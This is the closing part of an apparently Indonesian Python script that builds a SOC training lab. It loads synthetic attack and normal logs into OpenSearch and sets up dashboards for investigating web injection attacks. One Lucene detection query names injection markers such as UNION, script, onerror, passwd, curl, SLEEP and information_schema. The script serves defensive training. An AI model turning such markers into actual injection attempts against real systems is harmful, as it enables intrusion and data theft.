    "(mis. `q=O'Brien`) atau `1=1`.\n\n"
    "### 📝 Submit jawaban (8 task) di: **https://hack.redlimit.id/soc-lab**\n"
    "_Lab ini hanya untuk investigasi/visualisasi — pengerjaan & submit task ada di platform tersebut._"
)

# Payload injeksi yang BERHASIL (dipantulkan/dieksekusi, bukan diblok)
INJECT_LUCENE = (
    "http.response.status_code:200 AND ("
    "url.query:*UNION* OR url.query:*script* OR url.query:*onerror* OR url.query:*onload* "
    "OR url.query:*passwd* OR url.query:*curl* OR url.query:*SLEEP* "
    "OR url.query:*information_schema*)"
)


def _ss(query="", lang="kuery", with_index=True):
    d = {"query": {"query": query, "language": lang}, "filter": []}
    if with_index:
        d["indexRefName"] = "kibanaSavedObjectMeta.searchSourceJSON.index"
    return json.dumps(d)


def _idx_ref(index_id):
    return [{"name": "kibanaSavedObjectMeta.searchSourceJSON.index", "type": "index-pattern", "id": index_id}]


def _terms(field, size, bid="2", schema="bucket"):
    return {"id": bid, "enabled": True, "type": "terms", "schema": schema,
            "params": {"field": field, "orderBy": "1", "order": "desc", "size": size,
                       "otherBucket": False, "missingBucket": False}}


_COUNT = {"id": "1", "enabled": True, "type": "count", "schema": "metric", "params": {}}
_TABLE_PARAMS = {"perPage": 10, "showPartialRows": False, "showMetricsAtAllLevels": False,
                 "showTotal": False, "totalFunc": "sum", "percentageCol": ""}


def vs_markdown(title, md):
    return {"title": title, "type": "markdown", "aggs": [],
            "params": {"fontSize": 12, "openLinksInNewTab": True, "markdown": md}}


def vs_metric(title):
    return {"title": title, "type": "metric", "aggs": [_COUNT],
            "params": {"addTooltip": True, "addLegend": False, "type": "metric",
                       "metric": {"percentageMode": False, "useRanges": False, "colorSchema": "Green to Red",
                                  "metricColorMode": "None", "colorsRange": [{"from": 0, "to": 100000}],
                                  "labels": {"show": True}, "invertColors": False,
                                  "style": {"bgColor": False, "labelColor": False, "subText": "", "fontSize": 50}}}}


def vs_pie(title, field):
    return {"title": title, "type": "pie", "aggs": [_COUNT, _terms(field, 10, schema="segment")],
            "params": {"type": "pie", "addTooltip": True, "addLegend": True, "legendPosition": "right",
                       "isDonut": True, "labels": {"show": False, "values": True, "last_level": True, "truncate": 100}}}


def vs_histogram(title):
    return {"title": title, "type": "histogram",
            "aggs": [_COUNT, {"id": "2", "enabled": True, "type": "date_histogram", "schema": "segment",
                              "params": {"field": "@timestamp", "interval": "auto", "min_doc_count": 1}}],
            "params": {"type": "histogram", "grid": {"categoryLines": False},
                       "categoryAxes": [{"id": "CategoryAxis-1", "type": "category", "position": "bottom", "show": True,
                                         "scale": {"type": "linear"}, "labels": {"show": True, "filter": True, "truncate": 100}, "title": {}}],
                       "valueAxes": [{"id": "ValueAxis-1", "name": "LeftAxis-1", "type": "value", "position": "left", "show": True,
                                      "scale": {"type": "linear", "mode": "normal"},
                                      "labels": {"show": True, "rotate": 0, "filter": False, "truncate": 100},
                                      "title": {"text": "Jumlah event"}}],
                       "seriesParams": [{"show": True, "type": "histogram", "mode": "stacked",
                                         "data": {"label": "Count", "id": "1"}, "valueAxis": "ValueAxis-1",
                                         "drawLinesBetweenPoints": True, "lineWidth": 2, "showCircles": True}],
                       "addTooltip": True, "addLegend": False, "legendPosition": "right", "times": [], "addTimeMarker": False,
                       "labels": {"show": False}, "thresholdLine": {"show": False, "value": 10, "width": 1, "style": "full", "color": "#E7664C"}}}


def vs_table(title, bucket_fields):
    aggs = [_COUNT]
    for i, (f, size) in enumerate(bucket_fields):
        aggs.append(_terms(f, size, bid=str(i + 2)))
    return {"title": title, "type": "table", "aggs": aggs, "params": _TABLE_PARAMS}


def setup_dashboards():
    # securitytenant: global -> saved object disimpan di Global tenant (dibaca anonymous)
    hdr = {"osd-xsrf": "true", "securitytenant": "global"}
    log(f"menunggu Dashboards di {DASHBOARDS_URL} ...")
    ready = False
    for _ in range(120):
        code, _ = req("GET", f"{DASHBOARDS_URL}/api/status", extra_headers=hdr, timeout=5)
        if code == 200:
            ready = True
            break
        time.sleep(3)
    if not ready:
        log("WARN: Dashboards belum siap, lewati pembuatan saved objects.")
        return

    def post_so(so_type, sid, attributes, references=None):
        body = {"attributes": attributes}
        if references is not None:
            body["references"] = references
        code, resp = req("POST", f"{DASHBOARDS_URL}/api/saved_objects/{so_type}/{sid}?overwrite=true",
                         json.dumps(body), extra_headers=hdr)
        tag = "OK" if code in (200, 201) else ("ERR " + resp[:160])
        log(f"  {so_type}/{sid}: HTTP {code} {tag}")
        return code

    def viz(vid, vs, search_source, index_id=None):
        attr = {"title": vs["title"], "visState": json.dumps(vs), "uiStateJSON": "{}",
                "description": "", "version": 1,
                "kibanaSavedObjectMeta": {"searchSourceJSON": search_source}}
        post_so("visualization", vid, attr, _idx_ref(index_id) if index_id else [])

    # 1) index pattern
    post_so("index-pattern", WEB_INDEX, {"title": WEB_INDEX + "*", "timeFieldName": "@timestamp"})
    post_so("index-pattern", AUTH_INDEX, {"title": AUTH_INDEX + "*", "timeFieldName": "@timestamp"})

    # 2) visualisasi
    viz("v-brief", vs_markdown("Pengarahan Misi", BRIEF_MD), _ss(with_index=False))
    viz("v-total", vs_metric("Total Event Web"), _ss(), WEB_INDEX)
    viz("v-status", vs_pie("Distribusi Status Code", "http.response.status_code"), _ss(), WEB_INDEX)
    viz("v-timeline", vs_histogram("Event Web dari Waktu ke Waktu"), _ss(), WEB_INDEX)
    viz("v-topip", vs_table("Top Source IP (web)", [("source.ip", 15)]), _ss(), WEB_INDEX)
    viz("v-topurl", vs_table("Top URL Diakses", [("url.path", 20)]), _ss(), WEB_INDEX)
    viz("v-geo", vs_table("Asal Negara Source IP", [("source.geo.country_name", 12)]), _ss(), WEB_INDEX)
    viz("v-inject",
        vs_table("⚠ Payload injeksi yang BERHASIL (200)", [("url.original", 20), ("source.ip", 5)]),
        _ss(INJECT_LUCENE, lang="lucene"), WEB_INDEX)
    viz("v-topua", vs_table("User Agent per Source IP (cari tool scanner)", [("user_agent.original", 12), ("source.ip", 3)]),
        _ss(), WEB_INDEX)
    viz("v-auth", vs_table("Login Panel Admin — akun · IP · hasil", [("user.name", 10), ("source.ip", 5), ("event.action", 2)]),
        _ss("event.category:authentication", lang="lucene"), AUTH_INDEX)

    # 3) dashboard (layout grid 48 kolom)
    layout = [
        ("v-brief",    0,  0, 48, 10),
        ("v-total",    0, 10, 10,  9),
        ("v-status",  10, 10, 19,  9),
        ("v-timeline", 29, 10, 19, 9),
        ("v-topip",    0, 19, 24, 13),
        ("v-topurl",  24, 19, 24, 13),
        ("v-inject",   0, 32, 30, 14),
        ("v-geo",     30, 32, 18, 14),
        ("v-topua",    0, 46, 26, 13),
        ("v-auth",    26, 46, 22, 13),
    ]
    panels, refs = [], []
    for i, (vid, x, y, w, h) in enumerate(layout, 1):
        pid = str(i)
        panels.append({"version": OS_VERSION_FOR_PANEL, "gridData": {"x": x, "y": y, "w": w, "h": h, "i": pid},
                       "panelIndex": pid, "embeddableConfig": {}, "panelRefName": f"panel_{i}"})
        refs.append({"name": f"panel_{i}", "type": "visualization", "id": vid})

    dash_attr = {
        "title": "SOC Lab — Investigasi Serangan Injeksi Web",
        "description": "Dashboard investigasi untuk Operation: Tainted Input.",
        "panelsJSON": json.dumps(panels),
        "optionsJSON": json.dumps({"useMargins": True, "hidePanelTitles": False}),
        "version": 1,
        "timeRestore": True, "timeTo": f"{SCENARIO_DAY}T23:59:59.999Z", "timeFrom": f"{SCENARIO_DAY}T00:00:00.000Z",
        "kibanaSavedObjectMeta": {"searchSourceJSON": json.dumps({"query": {"query": "", "language": "kuery"}, "filter": []})},
    }
    post_so("dashboard", DASHBOARD_ID, dash_attr, refs)

    # 4) default index + rentang waktu Discover
    time_default = json.dumps({"from": f"{SCENARIO_DAY}T00:00:00.000Z", "to": f"{SCENARIO_DAY}T23:59:59.999Z"})
    req("POST", f"{DASHBOARDS_URL}/api/opensearch-dashboards/settings",
        json.dumps({"changes": {"defaultIndex": WEB_INDEX, "timepicker:timeDefaults": time_default}}),
        extra_headers=hdr)
    log("dashboard + index pattern + time range siap.")


# ----------------------------------------------------------------------------
def build_all():
    web, auth = [], []
    gen_normal_web(web)
    gen_normal_auth(auth)
    gen_nikto_noise(web)
    gen_decoy_waf_blocked(web)
    gen_decoy_xss_404(web)
    gen_pentest_scan(web)
    gen_legit_admin_activity(web, auth)
    gen_attack_chain(web, auth)
    web.sort(key=lambda d: d["@timestamp"])
    auth.sort(key=lambda d: d["@timestamp"])
    return web, auth


def main():
    if not wait_opensearch():
        sys.exit(1)
    if _BASIC_AUTH:
        log("mengatur akses anonymous read-only (Security REST API) ...")
        harden_security()
    log("membangun dataset ...")
    web, auth = build_all()
    log(f"web-access={len(web)} auth={len(auth)}")
    recreate_index(WEB_INDEX, WEB_MAPPING)
    recreate_index(AUTH_INDEX, AUTH_MAPPING)
    bulk_load(WEB_INDEX, web)
    bulk_load(AUTH_INDEX, auth)
    setup_dashboards()
    log("SELESAI. Lab siap.")


if __name__ == "__main__":
    main()
